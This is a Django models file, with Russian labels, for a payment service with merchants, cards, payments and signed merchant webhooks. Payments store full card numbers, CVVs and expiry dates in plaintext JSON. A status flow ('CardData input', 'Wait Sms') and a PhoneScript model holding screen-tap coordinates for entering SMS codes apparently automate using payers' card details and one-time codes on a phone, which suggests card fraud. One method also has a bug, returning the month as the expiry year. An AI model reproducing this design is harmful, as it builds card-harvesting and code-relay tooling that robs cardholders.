import datetime
import json
import logging
import uuid

import requests
import structlog
from django.contrib.auth import get_user_model

from django.core.validators import MinValueValidator, MaxValueValidator
from django.db import models
from django.db.models.functions import Lower
from django.db.models.signals import post_save, pre_save
from django.dispatch import receiver
from django_better_admin_arrayfield.models.fields import ArrayField

from core.global_func import hash_gen
from deposit.models import Incoming
from payment.task import send_merch_webhook

logger = structlog.get_logger(__name__)

User = get_user_model()


class Merchant(models.Model):
    name = models.CharField('Название', max_length=100)
    owner = models.ForeignKey(to=User, related_name='merchants', on_delete=models.CASCADE,)
    is_active = models.BooleanField(default=False)
    host = models.URLField('Адрес для отправки вэбхук')
    secret = models.CharField('Your secret key', max_length=256)
    # Endpoints
    pay_success_endpoint = models.URLField('Url for redirect user back to your site', null=True, blank=True)

    def __str__(self):
        return f'{self.id}. {self.name} {self.host}'

    class Meta:
        ordering = ('id',)


class CreditCard(models.Model):
    card_number = models.CharField('Номер карты', max_length=19)
    owner_name = models.CharField('Имя владельца', max_length=100, null=True, blank=True)
    cvv = models.CharField(max_length=4, null=True, blank=True)
    card_type = models.CharField('Система карты', max_length=100)
    card_bank = models.CharField('Название банка', max_length=50, default='Bank')
    expired_month = models.IntegerField(validators=[MinValueValidator(1), MaxValueValidator(12)])
    expired_year = models.IntegerField(validators=[MinValueValidator(20), MaxValueValidator(99)])
    status = models.CharField('Статус карты',
                              default='not_active',
                              choices=[
                                  ('active', 'Активна'),
                                  ('not_active', 'Не активна'),
                                  ('blocked', 'Заблокирована')
                              ])

    def __repr__(self):
        string = f'{self.__class__.__name__} ({self.id}){self.card_number}'
        return string

    def __str__(self):
        string = f'СС {self.id}. {self.card_number}'
        return string


PAY_TYPE = (
        ('card-to-card', 'card-to-card'),
        ('card-to-m10', 'card-to-m10'),
    )


class PayRequisite(models.Model):

    pay_type = models.CharField('Тип платежа', choices=PAY_TYPE)
    card = models.ForeignKey(CreditCard, on_delete=models.CASCADE, null=True, blank=True)
    is_active = models.BooleanField(default=False)
    info = models.CharField('Инструкция', null=True, blank=True)
    min_amount = models.FloatField(default=0)
    max_amount = models.FloatField(default=10000)

    def __repr__(self):
        string = f'{self.__class__.__name__}({self.id})'
        return string

    def __str__(self):
        string = f'{self.pay_type} {self.id}. {self.card}'
        return string


class Payment(models.Model):
    PAYMENT_STATUS = (
        (-1, '-1. Decline'),
        (0, '0. Created'),
        (3, '3. CardData input.'),
        (4, '4. Send to work'),
        (5, '5. Wait Sms'),
        (6, '6. Work complited'),
        (7, '7. Await confirm'),
        (9, '9. Confirmed'),
    )

    def __init__(self, *args, **kwargs) -> None:
        # logger.debug(f'__init__ Payment {args} {kwargs}')
        super().__init__(*args, **kwargs)
        self.cached_status = self.status

    id = models.UUIDField(primary_key=True, default=uuid.uuid4, editable=False, max_length=36, db_index=True, unique=True,)
    merchant = models.ForeignKey('Merchant', on_delete=models.CASCADE)
    order_id = models.CharField(max_length=36, db_index=True)
    amount = models.IntegerField('Сумма заявки', null=True)

    user_login = models.CharField(max_length=36, null=True, blank=True)
    owner_name = models.CharField(max_length=100, null=True, blank=True)
    pay_requisite = models.ForeignKey('PayRequisite', on_delete=models.CASCADE, null=True, blank=True)
    pay_type = models.CharField('Тип платежа', choices=PAY_TYPE)
    screenshot = models.ImageField(upload_to='uploaded_pay_screens/',
                      verbose_name='Ваша квитанция', null=True, blank=True, help_text='Приложите скриншот квитанции после оплаты')
    create_at = models.DateTimeField('Время добавления в базу', auto_now_add=True)
    status = models.IntegerField('Статус заявки',
                                 default=0,
                                 choices=PAYMENT_STATUS)
    change_time = models.DateTimeField('Время изменения в базе', auto_now=True)
    cc_data_input_time = models.DateTimeField('Время ввода данных карты', null=True, blank=True)
    confirmed_time = models.DateTimeField('Время подтверждения', null=True, blank=True)

    # Данные отправителя
    phone = models.CharField('Телефон отправителя', max_length=20, null=True, blank=True)
    referrer = models.URLField('Откуда пришел', null=True, blank=True)
    card_data = models.JSONField(default=str, blank=True)
    phone_script_data = models.JSONField(default=str, blank=True)

    # Подтверждение:
    confirmed_incoming = models.OneToOneField(verbose_name='Платеж', to=Incoming,
                                    on_delete=models.SET_NULL, null=True, blank=True)
    confirmed_amount = models.IntegerField('Подтвержденная сумма заявки', null=True, blank=True)
    comment = models.CharField('Комментарий', max_length=1000, null=True, blank=True)
    response_status_code = models.IntegerField(null=True, blank=True)

    def __str__(self):
        string = f'{self.__class__.__name__} {self.id}.'
        return string

    def status_str(self):
        for status_num, status_str in self.PAYMENT_STATUS:
            if status_num == self.status:
                return status_str

    def card_data_str(self):
        if not self.card_data:
            return ''
        data = json.loads(self.card_data)
        result = ''
        for k, v in data.items():
            result += f'{v} '
        return result

    def card_number(self):
        if not self.card_data:
            return ''
        data = json.loads(self.card_data)
        return data.get('card_number')

    def expired_month(self):
        if not self.card_data:
            return ''
        data = json.loads(self.card_data)
        return data.get('expired_month')

    def expired_year(self):
        if not self.card_data:
            return ''
        data = json.loads(self.card_data)
        return data.get('expired_month')

    def cvv(self):
        if not self.card_data:
            return ''
        data = json.loads(self.card_data)
        return data.get('cvv')

    def card_data_url(self):
        import urllib.parse
        if not self.card_data:
            return ''
        data = json.loads(self.card_data)
        query = urllib.parse.urlencode(data)
        return query

    def phone_script_data_url(self):
        import urllib.parse
        if not self.phone_script_data:
            return ''
        data = json.loads(self.phone_script_data)
        query = urllib.parse.urlencode(data)
        return query

    def short_id(self):
        return f'{str(self.id)[-6:]}'

    class Meta:
        ordering = ('-create_at',)


class PhoneScript(models.Model):
    name = models.CharField('Наименование', unique=True)
    step_1 = models.BooleanField('Шаг 1. Ввод карты', default=1)
    step_2_required = models.BooleanField('Нужен ли ввод смс', default=1)
    step_2_x = models.IntegerField('Тап x для ввода смс', null=True, blank=True)
    step_2_y = models.IntegerField('Тап y для ввода смс', null=True, blank=True)
    # auto_step_3 = models.BooleanField('Шаг 3 авто', default=0)
    step_3_x = models.IntegerField('Тап x для подтверждения смс', null=True, blank=True)
    step_3_y = models.IntegerField('Тап y для подтверждения смс', null=True, blank=True)
    # bins = ArrayField(base_field=models.IntegerField(), default=list, blank=True)

    def data_json(self):
        data = {}
        keys = ['name', 'step_1', 'step_2_required', 'step_2_x', 'step_2_y', 'step_3_x', 'step_3_y']
        for k, v in self.__dict__.items():
            if k in keys and v:
                data[k] = v
        return json.dumps(data, ensure_ascii=False)

    def __str__(self):
        return f'PhoneScript("{self.name}")'

    def __repr__(self):
        return f'PhoneScript("{self.name}")'


class Bank(models.Model):
    name = models.CharField('Наименование', unique=True)
    bins = ArrayField(base_field=models.IntegerField(), default=list, blank=True)
    script = models.ForeignKey('PhoneScript', on_delete=models.CASCADE)
    instruction = models.CharField('Инструкция', null=True, blank=True)
    image = models.ImageField('Иконка банка', upload_to='bank_icons', null=True, blank=True)


# @receiver(pre_save, sender=PhoneScript)
# def after_save_script(sender, instance: PhoneScript, raw, using, update_fields, *args, **kwargs):
#     instance.bins = sorted(instance.bins)

@receiver(pre_save, sender=Payment)
def pre_save_pay(sender, instance: Payment, raw, using, update_fields, *args, **kwargs):
    logger.debug(f'pre_save_status = {instance.status} cashed: {instance.cached_status}')
    # Если статус изменился на 9 (потвержден):
    if instance.status == 9 and instance.cached_status != 9:
        if not instance.confirmed_time:
            instance.confirmed_time = datetime.datetime.now()


@receiver(post_save, sender=Payment)
def after_save_pay(sender, instance: Payment, created, raw, using, update_fields, *args, **kwargs):
    logger.debug(f'post_save_status = {instance.status}  cashed: {instance.cached_status}')
    # Если статус изменился с на 9 (потвержден):
    if instance.status == 9 and instance.cached_status != 9:
        logger.info('Выполняем действие полсле подтверждения платежа')
        data = {
            "id": str(instance.id),
            "order_id": instance.order_id,
            "user_login": instance.user_login,
            "amount": instance.amount,
            "create_at": instance.create_at.isoformat(),
            "status": instance.status,
            "confirmed_time": instance.confirmed_time.isoformat(),
            "confirmed_amount": instance.confirmed_amount,
            "signature": hash_gen(
                # merchant_id + id + confirmed_amount + secret_key
                f'{instance.merchant.id}{str(instance.id)}{instance.confirmed_amount}',
                instance.merchant.secret
            )
        }
        result = send_merch_webhook(url=instance.merchant.host, data=data)
        logger.info(f'answer: {result}')
    
    # Отправка вэбхука если статус изменился на 5 - ожидание смс:
    if instance.status == 5 and instance.cached_status != 5:
        data = {
            'order_id': instance.order_id,
            'id': str(instance.id),
            'status': 5,
            'signature': hash_gen(f'{instance.order_id}{str(instance.id)}5', instance.merchant.secret)
        }
        result = send_merch_webhook(url=instance.merchant.host, data=data)
        logger.info(f'answer: {result}')
        